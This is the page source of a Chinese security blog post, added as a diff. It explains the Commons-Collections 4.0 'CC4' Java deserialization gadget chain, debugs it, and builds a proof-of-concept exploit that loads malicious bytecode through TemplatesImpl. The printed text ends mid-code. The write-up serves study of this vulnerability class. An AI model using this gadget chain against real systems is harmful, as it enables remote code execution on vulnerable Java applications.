@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"sunian19.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.8.1","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="环境  JDK8u65 openJDK 8u65 Maven 3.6.3(其余版本可以先试试，不行再降版本) Commons-Collections 4.0 (除 4.0 的其他版本去掉了 InvokerTransformer 的 Serializable 继承，导致无法序列化。)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="&#39;Java反序列化-cc4&#39;">
+<meta property="og:url" content="https://sunian19.github.io/2022/11/06/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc4/index.html">
+<meta property="og:site_name" content="zer0_c|imb&#39;s blog">
+<meta property="og:description" content="环境  JDK8u65 openJDK 8u65 Maven 3.6.3(其余版本可以先试试，不行再降版本) Commons-Collections 4.0 (除 4.0 的其他版本去掉了 InvokerTransformer 的 Serializable 继承，导致无法序列化。)">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java158.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java159.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java160.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java161.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java162.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java163.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java164.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java165.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java166.png">
+<meta property="article:published_time" content="2022-11-05T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-11-06T14:50:18.709Z">
+<meta property="article:author" content="zer0_c|imb">
+<meta property="article:tag" content="java安全系列">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sunian19.github.io/imgss/java158.png">
+
+
+<link rel="canonical" href="https://sunian19.github.io/2022/11/06/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc4/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://sunian19.github.io/2022/11/06/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc4/","path":"2022/11/06/java反序列化-cc4/","title":"'Java反序列化-cc4'"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>'Java反序列化-cc4' | zer0_c|imb's blog</title>
+  
+
+  <script src="/js/third-party/analytics/baidu-analytics.js"></script>
+  <script async src="https://hm.baidu.com/hm.js?48584c486973b4bf025a425c3d7b4007"></script>
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">zer0_c|imb's blog</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#huan-jing"><span class="nav-number">1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cc-4-gong-ji-lian-fen-xi"><span class="nav-number">2.</span> <span class="nav-text">cc4攻击链分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gou-zao-poc"><span class="nav-number">3.</span> <span class="nav-text">构造poc</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="zer0_c|imb"
+      src="/imgss/touxiang.jpg">
+  <p class="site-author-name" itemprop="name">zer0_c|imb</p>
+  <div class="site-description" itemprop="description">忘川河畔彼岸花，红如鲜血似朱砂</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">94</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">39</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="mailto:lingyu195@gmail.com" title="E-Mail → mailto:lingyu195@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=3504078815" title="QQ → tencent:&#x2F;&#x2F;AddContact&#x2F;?fromId&#x3D;45&amp;fromSubId&#x3D;1&amp;subcmd&#x3D;all&amp;uin&#x3D;3504078815" rel="noopener" target="_blank"><i class="qq fa-fw"></i>QQ</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://www.ch4ser.top/" title="http:&#x2F;&#x2F;www.ch4ser.top&#x2F;" rel="noopener" target="_blank">ch4ser</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://hackergu.com/" title="http:&#x2F;&#x2F;hackergu.com&#x2F;" rel="noopener" target="_blank">Gu</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://al0neranger.github.io/" title="https:&#x2F;&#x2F;al0neranger.github.io&#x2F;" rel="noopener" target="_blank">al0neranger</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/lyshark" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;lyshark" rel="noopener" target="_blank">lyshark</a>
+        </li>
+    </ul>
+  </div>
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sunian19.github.io/2022/11/06/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/imgss/touxiang.jpg">
+      <meta itemprop="name" content="zer0_c|imb">
+      <meta itemprop="description" content="忘川河畔彼岸花，红如鲜血似朱砂">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zer0_c|imb's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          'Java反序列化-cc4'
+        </h1>
+
+
+        <div class="post-meta">
+        
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-11-06 00:00:00 / 修改时间：22:50:18" itemprop="dateCreated datePublished" datetime="2022-11-06T00:00:00+08:00">2022-11-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/java%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">java安全系列</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="huan-jing" id="环境">环境</h3>
+<ul>
+<li>JDK8u65</li>
+<li>openJDK 8u65</li>
+<li>Maven 3.6.3(其余版本可以先试试，不行再降版本)</li>
+<li>Commons-Collections 4.0<br>
+(除 4.0 的其他版本去掉了 InvokerTransformer 的 Serializable 继承，导致无法序列化。)</li>
+</ul>
+<a id="more"></a>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span>&lt;<span class="title">I</span>, <span class="title">O</span>&gt; <span class="keyword">implements</span> <span class="title">Transformer</span>&lt;<span class="title">I</span>, <span class="title">O</span>&gt; </span>&#123;</span><br><span class="line"><span class="comment">//以上为4.4版本的InvokerTransformer</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span>&lt;<span class="title">I</span>, <span class="title">O</span>&gt; <span class="keyword">implements</span> <span class="title">Transformer</span>&lt;<span class="title">I</span>, <span class="title">O</span>&gt;, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"><span class="comment">//此为4.0版本的invoker</span></span><br></pre></td></tr></table></figure></div>
+<p>所以环境使用4.0版本</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https:<span class="comment">//mvnrepository.com/artifact/org.apache.commons/commons-collections4 --&gt;</span></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>记得reimport</p>
+<h3 id="cc-4-gong-ji-lian-fen-xi" id="cc4攻击链分析">cc4攻击链分析</h3>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">            PriorityQueue.readObject()</span><br><span class="line">                ...</span><br><span class="line">                    TransformingComparator.compare()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Runtime.exec()</span><br></pre></td></tr></table></figure></div>
+<p>根据yso的提示，进行调试</p>
+<p>我们去找TransformingComparator.compare()</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(<span class="keyword">final</span> I obj1, <span class="keyword">final</span> I obj2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> O value1 = <span class="keyword">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="keyword">final</span> O value2 = <span class="keyword">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>调用了transform。</p>
+<p>上边的链子，看PriorityQueue类</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue.readObject() --&gt; heapify() --&gt; siftDown() --&gt; siftDownUsingComparator() --&gt; comparator.compare()</span><br><span class="line">--&gt;</span><br><span class="line">TransformingComparator.compare()</span><br></pre></td></tr></table></figure></div>
+<p>后面就还是InvokerTransformer.transform那条链 或者 cc3的链子。</p>
+<p><img src="/imgss/java158.png" alt=""></p>
+<h3 id="gou-zao-poc" id="构造poc">构造poc</h3>
+<p>后半段的poc</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">Class aClass = templates.getClass();</span><br><span class="line"></span><br><span class="line">Field nameField = aClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">nameField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">nameField.set(templates,<span class="string">&quot;zer0&quot;</span>);</span><br><span class="line"></span><br><span class="line">Field bytecodesField = aClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\code\\CCTest\\src\\main\\java\\Calc.class&quot;</span>));</span><br><span class="line"><span class="keyword">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">Field tfactoryField = aClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">tfactoryField.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">InstantiateTransformer instantiateTransformer = <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="keyword">new</span> Object[]&#123;templates&#125;);</span><br><span class="line"></span><br><span class="line">instantiateTransformer.transform(TrAXFilter.class);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Transformer[] transformers = new Transformer[]&#123;</span></span><br><span class="line"><span class="comment">//         new ConstantTransformer(TrAXFilter.class),</span></span><br><span class="line"><span class="comment">//         instantiateTransformer</span></span><br><span class="line"><span class="comment">// &#125;;</span></span><br><span class="line"><span class="comment">// ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span></span><br></pre></td></tr></table></figure></div>
+<p><img src="/imgss/java159.png" alt=""></p>
+<p>代码测试成功，准备进行下一步exp的编写。</p>
+<p>代码用法与伪代码如下</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">TransformingComparator</span><span class="params">(<span class="keyword">final</span> Transformer&lt;? <span class="keyword">super</span> I, ? extends O&gt; transformer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(transformer, ComparatorUtils.NATURAL_COMPARATOR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">PriorityQueue</span><span class="params">(Comparator&lt;? <span class="keyword">super</span> E&gt; comparator)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(DEFAULT_INITIAL_CAPACITY, comparator);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//先调用TransformingComparator</span></span><br><span class="line">TransformingComparator transformingComparator = <span class="keyword">new</span> TransformingComparator&lt;&gt;(chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//然后调用优先队列，也可直接传入</span></span><br><span class="line">PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue&lt;&gt;(transformingComparator);</span><br></pre></td></tr></table></figure></div>
+<p>理论上说，直接序列化反序列化即可</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">        serialize(priorityQueue);</span><br><span class="line"><span class="comment">//        unserialization(&quot;./2.ser&quot;);</span></span><br></pre></td></tr></table></figure></div>
+<p>但是并没有弹计算器。下断点进行调试。</p>
+<p>断点位置：PriorityQueue 的 736 行 siftDown() 代码，以及 795 行的 heapify() 代码。Debug 一下。</p>
+<p><img src="/imgss/java160.png" alt=""></p>
+<p>可以看到slot_1 = -1 直接跳出了heapify方法。<br>
+原因是这一段 size &gt;&gt;&gt; 1，&gt;&gt;&gt; 是移位运算符。</p>
+<p>具体用法可以不用管，我们点击 Evaluate Expression(alt+F8)，将 size 的值进行替换，知道 size 等于 1 时，才算成功。</p>
+<p><img src="/imgss/java161.png" alt=""></p>
+<p>当我们将 Size 的值修改成 2 的时候，得到 Result 为 1，是可以进入循环的，所以现在我们要想办法将 Size 的值变成 2。</p>
+<p><img src="/imgss/java162.png" alt=""></p>
+<p>要修改 Size，必然要先明白 Size 是什么，Size 就是 PriorityQueue 这个队列的长度，简单理解，就是数组的长度。现在我们这个数组的长度为 0，0 - 1 = -1，所以会直接跳出循环，不能弹计算器。</p>
+<p><img src="/imgss/java163.png" alt=""></p>
+<p>利用PriorityQueue优先队列的add方法，对size的值进行操作。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">priorityQueue.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure></div>
+<p>我认为的最终exp</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC4Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IOException, IllegalAccessException, ClassNotFoundException </span>&#123;</span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class aClass = templates.getClass();</span><br><span class="line"></span><br><span class="line">        Field nameField = aClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;zer0&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field bytecodesField = aClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\code\\CCTest\\src\\main\\java\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        Field tfactoryField = aClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        InstantiateTransformer instantiateTransformer = <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="keyword">new</span> Object[]&#123;templates&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        instantiateTransformer.transform(TrAXFilter.class);</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        TransformingComparator transformingComparator = <span class="keyword">new</span> 